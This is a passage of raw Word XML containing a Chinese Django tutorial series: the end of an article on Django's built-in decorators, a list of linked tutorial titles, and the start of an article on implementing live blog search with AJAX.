        <w:t>@method_decorator(decorators, name='dispatch')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E482ADF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ProtectedView(TemplateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1442E4" w14:textId="0853B4B5" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A56EDCF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    template_name = 'secret.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33EDF4E4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75B44F51" w14:textId="58FE20E3" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24447F84" w14:textId="5507901F" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文总结了Django自带的常用装饰器的应用场景及如何正确使用它们。下文我们将介绍如何自定义Django装饰器并分享几个常用的自定义装饰器，欢迎关注。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DCB3EE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A076381" w14:textId="1E91C34D" w:rsidR="003802BB" w:rsidRPr="004300AE" w:rsidRDefault="003802BB" w:rsidP="004300AE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2019.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7234E7A1"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298" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(27): 快捷函数(shortcut function)模块详解</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId299" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(28): 如何设计充满陷阱的优美URL</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AD4D55E" w14:textId="6D57EA1E"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0" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(28): 如何设计充满陷阱的优美URL</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="220A339E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRDefault="001C47AF"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r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Django Web开发实战案例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6AFE46"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1" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战(1): 扩展Django自带User模型，实现用户注册与登录</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2FA9C761"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2" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战(2): 编辑用户个人资料，扩展Django后台UserAdmin</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1F52A922"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3" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0项目实战(3): 密码重置与退出登录</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="412F4F79"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4" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战: 图片上传与显示</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F08B1CB"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5" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战: PDF文件页面提取</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B99949C"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6" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战: PDF文件合并</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6DE6F2AB"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7" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战：输出树形分类目录</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FF88DB2"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08" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战: 网页计数器统计浏览次数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0D60BE02" w14:textId="5536DB63" w:rsidR="001C47AF" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">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060</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId309" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django 2.0 项目实战:  利用AJAX实现博文实时搜索</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="116C65A8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django实战: 利用AJAX技术实现博文实时搜索</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0684A272" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId310" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-05-31</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29589CAC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477F413C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django实战</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44588939" w14:textId="512D09ED" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>学习Python Web和Django开发不能只学习Python。我们有时必需借助其它技术比如AJAX实现我们想要的功能。今天我们就要利用Django 2.0 + AJAX开发一个功能性页面: 我们一边输入关键词，网页一边会给你提示所找到的博文数量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1395334A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是AJAX技术？它的应用场景有哪些?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D44D96" w14:textId="570AB776" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Ajax 即“Asynchronous Javascript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。通过在后台与服务器进行少量数据交换，Ajax 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB125B2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Ajax常见应用场景包括:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FFEBF8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>搜索提示: 在你输入关键词还未提交前，搜索框给你提示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160C3574"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用户名验证: 当你输入用户名时，页面提示你是否已注册。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6B6AFF" w14:textId="477B0F67" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>显示投票结果：用户投票后，不用加载页面即可显示投票结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC0B756" w14:textId="787BFBE2" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>评论加载: 在你提交新的评论后，不用重新加载整个网页就会显示新提交的评论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F013FD6" w14:textId="7DBDE15F" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>以上场景都是Django单靠自己无法实现的。注意Ajax应只用于与服务器少量数据交换，且存安全隐患，不宜广泛使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFAE43C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>总体开发思路</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D12B66D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们创建一个叫blog的APP，并把它加入到INSTALLED_APP里去，然后在后台添加一些文章, 用于搜索(如下所示)。我们需要设计2个功能性页面: 一个展示博客文章清单，一个搜索页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61ED4B56" w14:textId="27CB3D40" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="191919"/>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1910AEBA" wp14:editId="53F98E0C">
            <wp:extent cx="2628900" cy="2028825"/>
            <wp:effectExtent l="0" t="0" r="0" b="952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628900" cy="2028825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="522E74DF" w14:textId="7092AC8C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下面我们来看下具体代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B46791C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A108CE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本案例中所用到的Article模型代码如下: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB75E7C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4001BD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7624BEF6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0735F4E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils.timezone import now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260288CA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B09D20F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42CE04CD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79E0C1A5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
